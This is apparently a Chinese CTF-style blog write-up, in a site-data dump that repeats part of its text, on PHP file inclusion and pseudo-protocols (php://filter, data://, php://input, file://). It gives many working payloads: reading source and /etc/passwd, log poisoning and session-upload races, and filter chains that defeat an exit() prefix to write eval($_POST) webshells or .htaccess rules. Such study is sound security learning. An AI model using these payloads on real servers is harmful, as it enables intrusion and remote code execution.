<code>?filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=4.php&amp;content=?&gt;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==</code></p>\n<p><img src=\"https://i.loli.net/2020/12/03/Aqis5nurS2KY9kI.png\" alt=\"1.png\"></p>\n<p>可以看到成功写入。</p>\n<p>不过因为  <code>string.strip_tags</code>的原因，这个方法在PHP7版本还是会有局限性，但是在PHP5环境下是适用的。</p>\n<p>另一种方式，针对PHP7环境下：</p>\n<p><code>filename=php://filter/write=zlib.deflate|string.tolower|zlib.inflate/resource=5.php&amp;content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0dphpinfo();?&gt;/resource=5.php</code>  </p>\n<p>压缩、转小写、解压，消去死亡exit，成功带入我们的 webshell</p>\n<p><img src=\"https://i.loli.net/2020/12/03/opFIQ86Nwlgsfzc.png\" alt=\"2.png\"></p>\n<p>再来看看demo2 ~</p>\n<h3 id=\"demo2\"><a href=\"#demo2\" class=\"headerlink\" title=\"demo2\"></a>demo2</h3><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token variable\">$content</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'content'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"&lt;?php exit();\"</span><span class=\"token punctuation\">.</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这个相较于demo1区别是，同一变量。</p>\n<h4 id=\"利用base64-1\"><a href=\"#利用base64-1\" class=\"headerlink\" title=\"利用base64\"></a>利用base64</h4><p>一开始还是想到使用base64编码：</p>\n<p><code>?content=php://filter/write/convert.base64-decode/resource=1.phpPD9waHAgcGhwaW5mbygpOz8+</code> 拼接后内容就是</p>\n<p><code>&lt;?php exit();php://filter/write/convert.base64-decode/resource=1.phpPD9waHAgcGhwaW5mbygpOz8+</code> 但是没有成功，因为’=’在base64编码中代表结束，所以等号后面还接上字母，会报错，转码不出来。</p>\n<p>所以这里可以结合 <code>string.strip_tags</code> 来去掉等号：</p>\n<p><code>?content=php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+.php</code></p>\n<p>在windows下，这种文件名的存在是很怪异的，但是在linux下测试是可行的：</p>\n<p><img src=\"https://i.loli.net/2020/12/03/nm3TNrAQzf5bOEM.png\" alt=\"3.png\"></p>\n<p>当然这个方式还是针对于PHP5</p>\n<p><code>?content=php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;/resource=7.php</code></p>\n<p>这里我们传过去可以看到：</p>\n<p><img src=\"https://i.loli.net/2020/12/03/mKYV2hBXDQvZrgJ.png\" alt=\"4.png\"></p>\n<p>访问 7.php文件，可以看到 phpinfo文件，同理我们可以构造shell</p>\n<h4 id=\"利用rot13-1\"><a href=\"#利用rot13-1\" class=\"headerlink\" title=\"利用rot13\"></a>利用rot13</h4><p>这里我们依然可以利用rot13，<code>?content=php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=8.php</code> </p>\n<p><img src=\"https://i.loli.net/2020/12/04/HZ4ScB3Nv81otGu.png\" alt=\"1233.png\"></p>\n<p>可以发现，用rot13成功写入，不过仍然存在短标签的问题。</p>\n<h4 id=\"利用usc-2\"><a href=\"#利用usc-2\" class=\"headerlink\" title=\"利用usc-2\"></a>利用usc-2</h4><p>通过usc-2编码，两位一反转。</p>\n<p><code>?content=php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp%20pe@av(l_$OPTSs[m1lp]e;)&gt;?/resource=9.php</code></p>\n<p><img src=\"https://i.loli.net/2020/12/04/P8xZ2qKNeO9Qwob.png\" alt=\"12.png\"></p>\n<p>可以看到成功写入，并且将前面的死亡代码糅杂消失。</p>\n<h4 id=\"利用usc-4\"><a href=\"#利用usc-4\" class=\"headerlink\" title=\"利用usc-4\"></a>利用usc-4</h4><p>和usc-2原理基本一致，不过这里是四位一反转。</p>\n<p><code>?content=php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@%20p(lavOP_$s[TS]pm1&gt;?;)/resource=10.php</code></p>\n<h4 id=\"utf-8、utf-7转换\"><a href=\"#utf-8、utf-7转换\" class=\"headerlink\" title=\"utf-8、utf-7转换\"></a>utf-8、utf-7转换</h4><p>测试发现：</p>\n<p><img src=\"https://i.loli.net/2020/12/04/FZmGyCQb5MfnAvO.png\" alt=\"13.png\"></p>\n<p>等号经过<code>utf-7</code>编码后会变成 +AD0- ，这样就可以消除等号的影响。并且：</p>\n<p><img src=\"https://i.loli.net/2020/12/04/uWVSQyApnEH58hF.png\" alt=\"14.png\"></p>\n<p>纯字符经过 <code>utf-7</code> 编码 ，和原来不会有太大区别，所以可以结合 utf7和base64解码来写马</p>\n<p><code>?content=php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=10.php</code></p>\n<p>本地可以看到已经成功写入：</p>\n<p><img src=\"https://i.loli.net/2020/12/06/CYKxaU7HFZM2diz.png\" alt=\"123.png\"></p>\n<h3 id=\"demo3\"><a href=\"#demo3\" class=\"headerlink\" title=\"demo3\"></a>demo3</h3><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token variable\">$filename</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n <span class=\"token variable\">$content</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'content'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$content</span> <span class=\"token punctuation\">.</span> <span class=\"token string\">\"\\nxxxxxx\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>其实可以直接写 <code>?content=&lt;?php phpinfo();?&gt;</code> 但其实题目一般都会有过滤，可能是过滤掉 起始符号 &lt;? ，这个时候我们可以利用 <code>.htaccess</code></p>\n<p>但是 <code>.htaccess</code> 文件，对内容要求很严格，多余冗杂的代码会导致文件失效和错误。所以我们考虑注释符。</p>\n<p>s1mple师傅的payload:</p>\n<p><code>?filename=.htaccess&amp;content=php_value%20auto_prepend_file%20D:\\phpStudy\\PHPTutorial\\WWW\\flag.php%0a%23\\</code></p>\n<p>我自己本地测试发现，在windows下不能使那个换行无效…，而在linux下似乎也不可行。后面有人如果能复现或者自己有思路可以绕过去的，欢迎与我讨论~</p>\n<p>参考链接：</p>\n<p><code>https://xz.aliyun.com/t/8163#toc-2</code></p>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>最近一直忙着考试和学校的各种实验，留的学安全的时间比较少，只能零碎时间来总结一下</p>\n<p>之前护网杯的一道Web题涉及到了这一块，一直想抽时间总结了解一下，一直鸽到现在了。</p>\n<p>废话不多说，这次主要是对文件包含以及相关读写函数的一些利用总结，也对相关姿势进行一下梳理。</p>\n<p>如果文档涉及到知识性的错误，欢迎与我来讨论</p>\n<p>联系方式 <code>512615513@qq.com</code></p>\n<h2 id=\"前置知识\"><a href=\"#前置知识\" class=\"headerlink\" title=\"前置知识\"></a>前置知识</h2><p>你需要了解的：</p>\n<ul>\n<li><p>PHP相关函数</p>\n<ul>\n<li>include</li>\n<li>file_get_content</li>\n<li>file_put_content</li>\n<li>……等等</li>\n<li>附图：</li>\n</ul>\n<p><img src=\"https://i.loli.net/2020/12/01/giQoUTpsCf8nmKt.png\" alt=\"BK_7E701ZG321YVC7J9MACP.png\"></p>\n</li>\n<li><p>PHP伪协议</p>\n<ul>\n<li>php://filter</li>\n<li>data://</li>\n<li>file://</li>\n</ul>\n<p>​     等等</p>\n<p><code>https://www.freebuf.com/column/148886.html</code> 对伪协议的一个讲解文章。</p>\n<p>适用环境附图：</p>\n<p><img src=\"https://i.loli.net/2020/12/01/qUmjYXn1ItHBxWT.png\" alt=\"123.png\"></p>\n</li>\n</ul>\n<h2 id=\"本地环境测试\"><a href=\"#本地环境测试\" class=\"headerlink\" title=\"本地环境测试\"></a>本地环境测试</h2><p>在阿清出的一道反序列化的题目中，使用伪协议发现了问题，发现打不通，然后本地测试了一下</p>\n<pre><code class=\"php\">&lt;?php\n\n highlight_file(__FILE__);\n $ceshi=$_GET[&#39;ceshi&#39;];\n include($ceshi);\n?&gt;</code></pre>\n<p>配合伪协议<code>php://filter</code>，payload为：<code>http://127.0.0.1/hello.php?ceshi=php://filter/read=convert.base64-encode/resource=flag.php</code> 可以读到base64编码后的flag</p>\n<p>如果换成 <code>$_post[&#39;ceshi&#39;]</code> 呢，答案是一样的。</p>\n<p>改一下源代码：</p>\n<pre><code class=\"php\"> &lt;?php\n highlight_file(__FILE__);\n $ceshi=$_GET[&#39;ceshi&#39;];\n echo file_get_contents($ceshi);\n ?&gt; </code></pre>\n<p>同样我们配合 <code>php://filter</code> 伪协议，payload为：<code>http://127.0.0.1/hello.php?ceshi=php://filter/read=convert.base64-encode/resource=flag.php</code> 可以读到base64编码后的flag，换成POST传参形式亦然。</p>\n<p>然后我们再来尝试一下data协议 (这里测试的时候注意更改一下 php.ini 的配置，默认allow_url_include 是 off)</p>\n<pre><code class=\"php\">&lt;?php\n highlight_file(__FILE__);\n $ceshi=$_GET[&#39;ceshi&#39;];\n include($ceshi);\n?&gt;</code></pre>\n<p>利用data:// 伪协议配合include函数可以执行包含文本内容：</p>\n<p><code>ceshi=data:text/plain,helloworld</code></p>\n<p>![BHKG_M9_ZR_8W4K@6PVUS`I.png](<a href=\"https://i.loli.net/2020/11/30/gNRqxLoirwlHF5p.png\" target=\"_blank\" rel=\"noopener\">https://i.loli.net/2020/11/30/gNRqxLoirwlHF5p.png</a>)</p>\n<p>同样，我们利用data://伪协议配合include函数可以执行PHP语句:</p>\n<p><code>ceshi=data:text/plain,&lt;?php phpinfo();?&gt;</code></p>\n<p>![_V8KVS~VX___1`I_2_7V28P.png](<a href=\"https://i.loli.net/2020/11/30/kjOEGUcSZxa3iDm.png\" target=\"_blank\" rel=\"noopener\">https://i.loli.net/2020/11/30/kjOEGUcSZxa3iDm.png</a>)</p>\n<p>如上图，这里本质上是使用data协议 包含了文本内容，文本内容为 <code>&lt;?php phpinfo();?&gt;</code> 然后被解析成PHP语句执行并返回结果。</p>\n<p>我们尝试一下<code>file_get_contents()</code>函数是不是也支持呢？测试一下：</p>\n<p><img src=\"https://i.loli.net/2020/11/30/O7R9PwE8FodH3Da.png\" alt=\"J_C4AEA2CN4TNWJ040_O__P.png\"></p>\n<p>然后我们尝试一下是不是也能支持PHP命令执行。</p>\n<p><img src=\"C:%5CUsers%5C86186%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201130165635700.png\" alt=\"image-20201130165635700\"></p>\n<p>显然，并不如我们想要的那样。</p>\n<p>为什么会出现这种原因，本质上还是在于对函数功能的理解，这两个函数 include和file_get_contents函数都是支持data伪协议的，这里的data协议用来获取文本数据，然后被include<strong>包含</strong>在当前php文件中，自然而然的就被解析成php代码，而file_get_contents函数只是获取文本的内容，而不是包含，所以没有被解析，从而造成代码执行。</p>\n<p>以上两个函数的本地测试只是想说明:</p>\n<ul>\n<li>存在一部分函数，它们是支持伪协议，并且配合伪协议可以达到一些意想不到的效果。</li>\n<li>同样是支持伪协议，但是不同函数的功能配合伪协议产生的效果也会很不一样。</li>\n</ul>\n<p>接下来对一些函数配合伪协议达到的妙用进行一个小结。</p>\n<h2 id=\"include-伪协议\"><a href=\"#include-伪协议\" class=\"headerlink\" title=\"include+伪协议\"></a>include+伪协议</h2><h3 id=\"php-filter-read-协议读源码\"><a href=\"#php-filter-read-协议读源码\" class=\"headerlink\" title=\"php://filter/read 协议读源码\"></a>php://filter/read 协议读源码</h3><p>姿势：</p>\n<p><code>ceshi=php://filter/read=convert.base64-encode/resource=flag.php</code></p>\n<p><code>ceshi=php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php</code></p>\n<p>这里的读取出来的编码可以有多种方式（后面看了利用编码写操作就发现多么骚了。），<code>base64、utf-8、utf-16</code>等等，有时候会被过滤，换着绕，另外本地测试发现用这个协议的时候，除了convert那里不能动，其他都可以换成大写小写混着，用这个trick可以绕过一些过滤。</p>\n<h3 id=\"data协议\"><a href=\"#data协议\" class=\"headerlink\" title=\"data协议\"></a>data协议</h3><p>可以利用data协议来执行PHP语句:</p>\n<p>姿势：</p>\n<p><code>data://text/plain,&lt;?php system(&#39;ls&#39;);?&gt;</code> 这里加不加 //都可。</p>\n<p>利用base64编码来绕过</p>\n<p><code>data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOz8+</code>  等效于执行 system(‘ls’);</p>\n<p>本地测试发现，除了data不能动，其他都可以混用大小写来达到绕过的目的。</p>\n<h3 id=\"include-php-input\"><a href=\"#include-php-input\" class=\"headerlink\" title=\"include+php://input\"></a>include+php://input</h3><pre><code class=\"php\">&lt;?php\n highlight_file(__FILE__);\n $ceshi=$_GET[&#39;ceshi&#39;];\n include($ceshi);\n?&gt;</code></pre>\n<p>仍然是这个代码，我们可以利用php://input 协议，利用如下：</p>\n<p><code>?ceshi=php://input</code>  然后 post 直接传数据  : <code>&lt;?php system(&#39;ls&#39;);</code> ，这里POST数据可控。</p>\n<p>不过这里有要求，当编码格式为 <code>enctype=&quot;multipart/form-data&quot;</code>  php://input是无效的。</p>\n<p>关于编码格式的解释，贴上一篇博客。</p>\n<p><code>https://blog.csdn.net/lingxiyizhi_ljx/article/details/102514560</code></p>\n<h3 id=\"include-file协议\"><a href=\"#include-file协议\" class=\"headerlink\" title=\"include+file协议\"></a>include+file协议</h3><p>我们这里可以直接用file协议读取本地文件系统的文件，需要使用绝对路径。</p>\n<p><code>?ceshi=file:///etc/passwd</code> ，这里前提是文件可访问。</p>\n<p><strong>大小写这个似乎对PHP的版本有要求，不同的版本有的可以，有的不行。</strong></p>\n<h2 id=\"include-可控文件\"><a href=\"#include-可控文件\" class=\"headerlink\" title=\"include+可控文件\"></a>include+可控文件</h2><p>文件包含的本质是包含一些危险代码，或者是webshell，如果一个文件的内容可控，我们包含之，就可以getshell</p>\n<h3 id=\"包含日志文件\"><a href=\"#包含日志文件\" class=\"headerlink\" title=\"包含日志文件\"></a>包含日志文件</h3><p>我们在UA头那里包含我们的一句话木马，然后包含日志文件，以nginx为例，日志路径为 /var/log/nginx/access.log </p>\n<p>![V85BD_E14H_XTZP`6K__XON.png](<a href=\"https://i.loli.net/2020/12/01/NP3yxK8haqInJke.png\" target=\"_blank\" rel=\"noopener\">https://i.loli.net/2020/12/01/NP3yxK8haqInJke.png</a>)</p>\n<p> 传过去，然后蚁剑连接，连接路径为 :  <code>https://127.0.0.1/ceshi.php?file=/var/log/nginx/access.log</code></p>\n<h3 id=\"利用session-upload-progress\"><a href=\"#利用session-upload-progress\" class=\"headerlink\" title=\"利用session.upload_progress\"></a>利用session.upload_progress</h3><p>这个思路听说早就有了，但是上上周才接触到，还是学的太少了。</p>\n<p>有一篇文章对 <code>session.upload_progress</code>讲的挺好，这里贴上链接：<code>https://www.freebuf.com/news/202819.html)</code></p>\n<p>简单来说就是上传一个 PHP_SESSION_UPLOAD_PROGRESS 文件，文件内容可以写上我们的shell。然后包含 /tmp/sess_xxx，这里xxx是可控的。然后在利用条件竞争（因为会被删除掉），这里可以直接抓包，利用 intruder模块来进行条件竞争。</p>\n<p>附上一个师傅的上传脚本：</p>\n<pre><code>#poc.php\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;body&gt;\n&lt;form action=&quot;ip&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;\n&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;2333&quot; /&gt;\n&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;\n&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&lt;?php\n    session_start();\n?&gt;</code></pre><p>抓包图：(用的师傅的一张。</p>\n<p><img src=\"https://i.loli.net/2020/12/01/AlEW6mKBDIkzVxg.png\" alt=\"W13K__CM_MV_5V8F_29_VX8.png\"></p>\n<p>有时候打不出来，可能是条件竞争没有成功，还没包含就被删掉了，可以考虑线程开大一点。</p>\n<h3 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h3><p>include + 伪协议来 getshell ，不局限于这两个文件，只要：</p>\n<ul>\n<li>文件内容可控</li>\n<li>文件可以被访问（也就是可以被包含）</li>\n</ul>\n<p>就可以成功getshell。</p>\n<h2 id=\"file-get-contents-伪协议\"><a href=\"#file-get-contents-伪协议\" class=\"headerlink\" title=\"file_get_contents + 伪协议\"></a>file_get_contents + 伪协议</h2><p>前面的那个本地测试的demo，对 php://filter和data://text 做了说明，其实 file_get_contents还可以结合 php://input</p>\n<p>demo:</p>\n<pre><code>\n$user = $_GET[&quot;txt&quot;];  \n$file = $_GET[&quot;file&quot;];  \n$pass = $_GET[&quot;password&quot;];  \n\nif(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)===&quot;welcome to the bugkuctf&quot;)){  \n    echo &quot;hello admin!&lt;br&gt;&quot;;  \n    include($file); //hint.php  \n}else{  \n    echo &quot;you are not admin ! &quot;;  \n}  \n</code></pre><p>这里其他不看，单纯来看 <code>(file_get_contents($user,&#39;r&#39;)===&quot;welcome to the bugkuctf&quot;)</code> 直接传 $user=”welcome xxx” 肯定是不现实的，因为这里是以文件的形式打开，所以我们这里可以尝试 ?user=php://input 然后post数据 welcome to the bugkuctf 即可，post的内容即会被识别为文件内容。</p>\n<h2 id=\"file-put-content-伪协议\"><a href=\"#file-put-content-伪协议\" class=\"headerlink\" title=\"file_put_content+伪协议\"></a>file_put_content+伪协议</h2><h3 id=\"写在前面\"><a href=\"#写在前面\" class=\"headerlink\" title=\"写在前面\"></a>写在前面</h3><p>file_put_contents 结合伪协议来写马，有着很多很骚的操作，其本质也是大同小异，就是利用过滤器编码来做一些操作。关于file_put_contents结合伪协议的考察，之前也遇到过，一直没有做个总结，现总结如下：</p>\n<h3 id=\"demo1\"><a href=\"#demo1\" class=\"headerlink\" title=\"demo1\"></a>demo1</h3><pre><code class=\"php\">&lt;?php\n highlight_file(__FILE__);\n $filename=$_GET[&#39;filename&#39;];\n $content=$_GET[&#39;content&#39;];\n file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);\n?&gt;</code></pre>\n<h4 id=\"利用base64\"><a href=\"#利用base64\" class=\"headerlink\" title=\"利用base64\"></a>利用base64</h4><p>这个之前在P牛的文章里面有提到过。原文章链接:</p>\n<p><code>https://www.leavesongs.com/PENETRATION/php-filter-magic.html</code></p>\n<p>base64是每4个字符进行编码，这里的 php exit 一共 7个字符，我们需要手动添上一个字符，剩下的就是我们可控代码了。</p>\n<p><code>?filename=php://filter/write/convert.base64-decode/resource=1.php&amp;content=XPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs=</code>  (这里的X是手动添加为了和前面凑8个</p>\n<p><img src=\"https://i.loli.net/2020/12/02/rXbgw1MVu6jyHKx.png\" alt=\"111.png\"></p>\n<h4 id=\"利用rot13\"><a href=\"#利用rot13\" class=\"headerlink\" title=\"利用rot13\"></a>利用rot13</h4><p>一个在线rot13编码解码的网站：</p>\n<p><a href=\"http://www.mxcz.net/tools/rot13.aspx\" target=\"_blank\" rel=\"noopener\">http://www.mxcz.net/tools/rot13.aspx</a></p>\n<p><code>?filename=php://filter/write=string.rot13/resource=2.php&amp;content=&lt;?cuc riny($_CBFG[&#39;pzq&#39;]);</code></p>\n<p><img src=\"https://i.loli.net/2020/12/02/tUKJwqIxC61O7s4.png\" alt=\"112.png\"></p>\n<p>可以发现成功写入shell，但是有个局限，如果开启了<strong>php短标签</strong>，这个就无效了。就会报错。</p>\n<h4 id=\"利用string-strip-tags结合-htaccess\"><a href=\"#利用string-strip-tags结合-htaccess\" class=\"headerlink\" title=\"利用string.strip_tags结合.htaccess\"></a>利用string.strip_tags结合.htaccess</h4><p>这个可以过滤掉PHP HTML标签  <code>&lt;?php ?&gt;</code> 中内容是可以直接吃完的。</p>\n<p>如果是Apache服务器，我们可以配合<code>.htaccess</code>文件来包含文件:</p>\n<p><code>filename=php://filter/write=string.strip_tags/resource=.htaccess&amp;content=&gt;php_value%20auto_prepend_file%20D:\\phpStudy\\PHPTutorial\\WWW\\flag.php</code></p>\n<p>可以看到成功写入：</p>\n<p><img src=\"https://i.loli.net/2020/12/02/kBcJiREuFwdAKS3.png\" alt=\"113.png\"></p>\n<p>然后访问：</p>\n<p><img src=\"https://i.loli.net/2020/12/02/UTnmcHASvVEfZqg.png\" alt=\"115.png\"></p>\n<p>该方法适用：</p>\n<ul>\n<li>PHP5版本可以，PHP7不行，7.3版本已废除这个标签</li>\n<li>apache环境</li>\n<li>文件名以及路径已知</li>\n</ul>\n<h4 id=\"过滤器编码组合\"><a href=\"#过滤器编码组合\" class=\"headerlink\" title=\"过滤器编码组合\"></a>过滤器编码组合</h4><p>顾名思义，就是利用过滤器的<strong>嵌套</strong>，来实现我们的目的。</p>\n<p>还是针对demo1的代码进行测试：</p>\n<p>我们传入 <code>?filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=4.php&amp;content=?&gt;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==</code></p>\n<p><img src=\"https://i.loli.net/2020/12/03/Aqis5nurS2KY9kI.png\" alt=\"1.png\"></p>\n<p>可以看到成功写入。</p>\n<p>不过因为  <code>string.strip_tags</code>的原因，这个方法在PHP7版本还是会有局限性，但是在PHP5环境下是适用的。</p>\n<p>另一种方式，针对PHP7环境下：</p>\n<p><code>filename=php://filter/write=zlib.deflate|string.tolower|zlib.inflate/resource=5.php&amp;content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0dphpinfo();?&gt;/resource=5.php</code>  </p>\n<p>压缩、转小写、解压，消去死亡exit，成功带入我们的 webshell</p>\n<p><img src=\"https://i.loli.net/2020/12/03/opFIQ86Nwlgsfzc.png\" alt=\"2.png\"></p>\n<p>再来看看demo2 ~</p>\n<h3 id=\"demo2\"><a href=\"#demo2\" class=\"headerlink\" title=\"demo2\"></a>demo2</h3><pre><code class=\"php\">&lt;?php\n highlight_file(__FILE__);\n $content=$_GET[&#39;content&#39;];\n file_put_contents($content,&quot;&lt;?php exit();&quot;.$content);\n?&gt;</code></pre>\n<p>这个相较于demo1区别是，同一变量。</p>\n<h4 id=\"利用base64-1\"><a href=\"#利用base64-1\" class=\"headerlink\" title=\"利用base64\"></a>利用base64</h4><p>一开始还是想到使用base64编码：</p>\n<p><code>?content=php://filter/write/convert.base64-decode/resource=1.phpPD9waHAgcGhwaW5mbygpOz8+</code> 拼接后内容就是</p>\n<p><code>&lt;?php exit();php://filter/write/convert.base64-decode/resource=1.phpPD9waHAgcGhwaW5mbygpOz8+</code> 但是没有成功，因为’=’在base64编码中代表结束，所以等号后面还接上字母，会报错，转码不出来。</p>\n<p>所以这里可以结合 <code>string.strip_tags</code> 来去掉等号：</p>\n<p><code>?content=php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+.php</code></p>\n<p>在windows下，这种文件名的存在是很怪异的，但是在linux下测试是可行的：</p>\n<p><img src=\"https://i.loli.net/2020/12/03/nm3TNrAQzf5bOEM.png\" alt=\"3.png\"></p>\n<p>当然这个方式还是针对于PHP5</p>\n<p><code>?content=php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;/resource=7.php</code></p>\n<p>这里我们传过去可以看到：</p>\n<p><img src=\"https://i.loli.net/2020/12/03/mKYV2hBXDQvZrgJ.png\" alt=\"4.png\"></p>\n<p>访问 7.php文件，可以看到 phpinfo文件，同理我们可以构造shell</p>\n<h4 id=\"利用rot13-1\"><a href=\"#利用rot13-1\" class=\"headerlink\" title=\"利用rot13\"></a>利用rot13</h4><p>这里我们依然可以利用rot13，<code>?content=php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=8.php</code> </p>\n<p><img src=\"https://i.loli.net/2020/12/04/HZ4ScB3Nv81otGu.png\" alt=\"1233.png\"></p>\n<p>可以发现，用rot13成功写入，不过仍然存在短标签的问题。</p>\n<h4 id=\"利用usc-2\"><a href=\"#利用usc-2\" class=\"headerlink\" title=\"利用usc-2\"></a>利用usc-2</h4><p>通过usc-2编码，两位一反转。</p>\n<p><code>?content=php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp%20pe@av(l_$OPTSs[m1lp]e;)&gt;?/resource=9.php</code></p>\n<p><img src=\"https://i.loli.net/2020/12/04/P8xZ2qKNeO9Qwob.png\" 